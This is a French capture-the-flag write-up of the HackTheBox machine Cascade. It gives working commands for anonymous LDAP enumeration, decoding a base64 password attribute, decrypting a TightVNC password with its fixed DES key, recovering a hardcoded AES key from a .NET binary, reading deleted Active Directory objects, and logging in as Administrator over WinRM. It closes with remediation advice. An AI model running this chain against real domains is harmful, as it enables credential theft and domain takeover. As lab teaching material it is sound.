# Cascade — HackTheBox

| | |
| --- | --- |
| **Plateforme** | HackTheBox |
| **OS** | Windows Server 2008 R2 (contrôleur de domaine) |
| **Difficulté** | 🟡 Medium |
| **Date** | 2026-10-04 |
| **Vecteur** | LDAP anonyme (`cascadeLegacyPwd` base64) → `r.thompson` → mot de passe **VNC** déchiffré → `s.smith` → partage **Audit$** + **reversing .NET** (clé AES en dur) → `arksvc` → **AD Recycle Bin** (`TempAdmin`) → mot de passe Administrator réutilisé |
| **CVE** | aucune — secrets réversibles + AD Recycle Bin |
| **Tags** | active-directory · ldap · vnc-decrypt · reversing-dotnet · ad-recycle-bin · cred-reuse |

> `<IP_CIBLE>` = IP de session (ex. `10.129.113.217`). Domaine `cascade.local`, DC = `CASC-DC1`, dans `/etc/hosts`.

> 🎯 **Nouveautés apprises ici** :
> 1) **Secrets réversibles en cascade** : mot de passe **base64** dans un attribut LDAP custom, mot de passe **VNC** déchiffrable (clé DES fixe publique), mot de passe chiffré par une **appli maison** qu'on rétro-ingénierie (clé AES **en dur**).
> 2) **AD Recycle Bin** : lire les objets **supprimés** de l'annuaire — un compte effacé garde ses attributs (dont un ancien mot de passe).
> 3) **Réutilisation de mot de passe** entre un compte temporaire supprimé (`TempAdmin`) et l'`Administrator`.

---

## TL;DR

LDAP **anonyme** expose un attribut custom `cascadeLegacyPwd` encodé en **base64** sur `r.thompson` →
mot de passe `rY4n5eva`. Avec ce compte, le partage SMB **Data** contient un export registre **TightVNC**
(`VNC Install.reg`) avec un mot de passe VNC chiffré par une **clé DES fixe publique** → déchiffré, c'est
le mot de passe de **`s.smith`** (`sT333ve2`), qui a accès WinRM (user flag) et au partage **`Audit$`**.
Ce partage contient une appli .NET maison (`CascAudit.exe` + `CascCrypto.dll` + base SQLite `Audit.db`) :
en la décompilant on récupère la **clé AES + l'IV en dur**, qui déchiffrent le mot de passe de **`arksvc`**
(`w3lc0meFr31nd`) stocké dans `Audit.db`. `arksvc` est membre du groupe **AD Recycle Bin** → il peut lire
les objets supprimés : le compte effacé **`TempAdmin`** garde un `cascadeLegacyPwd` (base64) →
`baCT3r1aN00dles`, **réutilisé** comme mot de passe de l'**Administrator** → DC compromis.

**LDAP anon (base64) → `r.thompson` → VNC decrypt → `s.smith` → Audit$ + reversing .NET (AES en dur) → `arksvc` → AD Recycle Bin (`TempAdmin`) → Administrator.**

---

## 1. Reconnaissance

```bash
└─$ nmap -sC -sV -oA nmap/cascade <IP_CIBLE>
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (Windows Server 2008 R2 SP1)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          AD LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          AD LDAP (Global Catalog)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
49154+/tcp open msrpc         RPC dynamiques
Service Info: Host: CASC-DC1; OS: Windows Server 2008 R2 SP1
```

| Port | Service | Ce que ça signale |
| --- | --- | --- |
| 53 | DNS | contrôleur de domaine |
| 88 | Kerberos | authentification AD |
| 135/139/445 | RPC/SMB | énumération, partages |
| 389/636/3268 | LDAP/LDAPS/GC | annuaire → objets, attributs custom |
| 5985 | WinRM | accès distant une fois des creds en main |

- Domaine / DC : **`cascade.local`** / **`CASC-DC1`** (Windows Server 2008 R2). → `/etc/hosts`.

---

## 2. Énumération LDAP anonyme → 1er compte

Le DC autorise une **liaison LDAP anonyme**. On dumpe tout et on cherche les attributs qui sentent le secret.

```bash
# dump complet + recherche de champs suspects
ldapsearch -x -H ldap://<IP_CIBLE> -b 'DC=cascade,DC=local' > ldap_dump.txt
cat ldap_dump.txt | grep -i -E 'pwd|pass|legacy'

# cible directement l'attribut custom repéré :
ldapsearch -x -H ldap://<IP_CIBLE> -b 'DC=cascade,DC=local' \
  '(objectClass=user)' cascadeLegacyPwd sAMAccountName
...
# Ryan Thompson, Users, UK, cascade.local
sAMAccountName: r.thompson
cascadeLegacyPwd: clk0bjVldmE=
```

Décodage (base64 ≠ chiffrement) :
```bash
└─$ echo 'clk0bjVldmE=' | base64 -d ; echo
rY4n5eva
```

- Attribut custom repéré : **`cascadeLegacyPwd`** (base64)
- 1er compte / mot de passe : **`r.thompson`** / **`rY4n5eva`**

> Réflexe AD : **lis TOUS les attributs** (`ldapsearch` complet). Les entreprises planquent des secrets
> dans des champs custom (`cascadeLegacyPwd`, `info`, `description`). Un attribut « legacy » = dette technique = cadeau.

---

## 3. Mouvement latéral — mot de passe VNC déchiffré

Avec `r.thompson`, on parcourt les partages SMB. Le partage **Data** contient un export registre TightVNC
laissé dans le dossier de `s.smith`.

```bash
└─$ smbclient //<IP_CIBLE>/Data -U 'r.thompson%rY4n5eva' -c 'recurse ON; prompt OFF; mget *'
getting file \IT\Temp\s.smith\VNC Install.reg ...
getting file \IT\Logs\Ark AD Recycle Bin\ArkAdRecycleBin.log ...   # indice sur la suite !
```

```ini
# IT/Temp/s.smith/VNC Install.reg
[HKEY_LOCAL_MACHINE\SOFTWARE\TightVNC\Server]
"Password"=hex:6b,cf,2a,4b,6e,5a,ca,0f
```

TightVNC stocke son mot de passe chiffré en **DES avec une clé fixe publique** (`e84ad660c4721ae0`) →
déchiffrable par n'importe qui :

```bash
└─$ echo -n '6bcf2a4b6e5aca0f' | xxd -r -p \
    | openssl enc -des-cbc -d --nopad -K e84ad660c4721ae0 -iv 0000000000000000
sT333ve2
```

Décorticage de la commande (à savoir expliquer à l'oral) :
- `echo -n '6bcf2a4b6e5aca0f'` : le mdp chiffré en hexa, `-n` = pas de retour-ligne (sinon octets corrompus).
- `xxd -r -p` : convertit l'hexa en **octets bruts** (`-r` reverse hex→binaire, `-p` plain).
- `openssl enc -des-cbc -d -K e84ad660c4721ae0 ...` : déchiffre en DES-CBC avec la **clé fixe du VNC**.

- Compte obtenu : **`s.smith`** / **`sT333ve2`**

```bash
└─$ evil-winrm -i <IP_CIBLE> -u s.smith -p 'sT333ve2'
*Evil-WinRM* PS C:\Users\s.smith\Desktop> dir     # user.txt
```

**Flag user :** `C:\Users\s.smith\Desktop\user.txt` (non publié).

> `s.smith` est membre du groupe **Audit Share** → accès **READ** au partage `Audit$` (la suite).

---

## 4. Reversing .NET — mot de passe de `arksvc`

`s.smith` peut lire le partage caché **`Audit$`** : une petite appli d'audit maison en .NET.

```bash
└─$ nxc smb <IP_CIBLE> -u s.smith -p 'sT333ve2' --shares
   Audit$          READ
   Data            READ
   ...
└─$ smbclient //<IP_CIBLE>/Audit$ -U 's.smith%sT333ve2' -c 'recurse ON; prompt OFF; mget *'
getting file \CascAudit.exe ...
getting file \CascCrypto.dll ...
getting file \DB\Audit.db ...
getting file \System.Data.SQLite.dll ...
```

Dans la base SQLite `Audit.db`, table **Ldap** : le mot de passe de `arksvc`, **chiffré** (base64) :
```bash
└─$ sqlite3 DB/Audit.db 'select * from Ldap;'
ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local
```

On décompile l'appli pour retrouver l'algo + les clés. Les littéraux .NET sont en **UTF-16**, d'où `strings -e l` :
```bash
└─$ strings -e l CascCrypto.dll | grep -E '^.{16}$'
1tdyjCbY1Ix49842          # ← IV (16 octets)
└─$ strings -e l CascAudit.exe  | grep -E '^.{16}$'
c4scadek3y654321          # ← Key AES (16 octets)
```
(Confirmé en décompilant `CascCrypto.dll` avec dnSpy/ILSpy : `Aes` en **CBC**, `Key`/`IV` chargés depuis ces chaînes en dur.)

Déchiffrement (AES-CBC, clé + IV en dur = chiffrement réversible) :
```python
from base64 import b64decode
from Crypto.Cipher import AES
key = b"c4scadek3y654321"
iv  = b"1tdyjCbY1Ix49842"
enc = b64decode("BQO5l5Kj9MdErXx6Q6AGOw==")
pt  = AES.new(key, AES.MODE_CBC, iv).decrypt(enc)
print(pt.rstrip(b"\x00").decode("utf-8", "ignore"))
# -> w3lc0meFr31nd
```

- Compte obtenu : **`arksvc`** / **`w3lc0meFr31nd`**

> **Leçon** : une clé cryptographique **dans le binaire** n'est qu'un encodage — on la retrouve en
> décompilant. Même principe que la clé DES fixe du VNC juste avant.

---

## 5. Élévation — AD Recycle Bin → Administrator

`arksvc` est membre du groupe **AD Recycle Bin** → il peut lire les **objets supprimés** de l'annuaire.

```powershell
└─$ evil-winrm -i <IP_CIBLE> -u arksvc -p 'w3lc0meFr31nd'
*Evil-WinRM* PS C:\> Get-ADGroupMember "AD Recycle Bin" | Select name
name
----
ArkSvc

# lire les objets supprimés + leurs attributs
*Evil-WinRM* PS C:\> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties * |
                     Select name, cascadeLegacyPwd
# -> TempAdmin : YmFDVDNyMWFOMDBkbGVz
```

Le compte supprimé **`TempAdmin`** garde un `cascadeLegacyPwd` (encore du base64) :
```bash
└─$ echo 'YmFDVDNyMWFOMDBkbGVz' | base64 -d ; echo
baCT3r1aN00dles
```

`TempAdmin` était un admin temporaire créé **avec le même mot de passe que l'Administrator** (réutilisation).
On teste sur **`Administrator`** (le compte `TempAdmin` lui est supprimé) :

```bash
└─$ evil-winrm -i <IP_CIBLE> -u Administrator -p 'baCT3r1aN00dles'
*Evil-WinRM* PS C:\Users\Administrator\Desktop> dir     # root.txt
```

- Compte supprimé source : **`TempAdmin`** (`cascadeLegacyPwd` base64)
- Mot de passe récupéré, réutilisé par l'admin : **`baCT3r1aN00dles`**

**Flag root :** `C:\Users\Administrator\Desktop\root.txt` (non publié).

> **Pourquoi ça marche** : l'AD Recycle Bin conserve les objets supprimés **avec leurs attributs** ;
> un mot de passe planqué dans un champ custom survit donc à la suppression du compte. Et la **réutilisation
> de mot de passe** entre `TempAdmin` et `Administrator` fait tomber le domaine.

---

## 6. Remédiation

- Purger les secrets des **attributs AD** (`cascadeLegacyPwd`, `info`, `description`) — et se souvenir que la **corbeille** les conserve.
- Désactiver la **liaison LDAP anonyme** (`dsHeuristics`).
- Ne **jamais** chiffrer avec une **clé en dur** dans une appli ; utiliser DPAPI / gMSA / un coffre.
- VNC : ne pas stocker le mot de passe (clé publique, chiffrement cosmétique).
- **Pas de réutilisation** de mot de passe entre comptes ; moindre privilège sur la lecture de l'AD Recycle Bin.

---

## 7. Leçons

- **Chaîne de secrets réversibles** : base64 (encodage, pas chiffrement) → clé DES fixe (VNC) → clé AES en dur (appli .NET). Trois « protections » qui n'en sont pas. À l'oral : *« encodage/obfuscation ≠ chiffrement ; une clé qui voyage avec le secret ne protège rien »*.
- **Reversing .NET léger** : le CIL conserve les métadonnées → décompilation quasi parfaite (dnSpy/ILSpy) ; les littéraux sont en UTF-16 (`strings -e l`). La clé + l'IV se lisent directement dans la classe de chiffrement.
- **AD Recycle Bin** : une famille d'énumération à connaître — un compte supprimé n'efface pas ses attributs ; le groupe « AD Recycle Bin » est un privilège discret mais juteux.
- **Réutilisation de mot de passe** : le pivot final n'est pas une faille technique mais une mauvaise pratique humaine (TempAdmin = Administrator).
- **Méthode** : lire la doc des outils trouvés (`Audit.db`, `ArkAdRecycleBin.log` pointaient la suite) — les artefacts laissés sur les partages racontent l'intention de l'admin.

---

## Références

- TightVNC fixed DES key — connaissance publique (`e84ad660c4721ae0`)
- Fiches liées : [smb](../outils/smb.md) · [bloodhound](../outils/bloodhound.md) · [ad-attacks](../outils/ad-attacks.md) · [hashcat](../outils/hashcat.md)
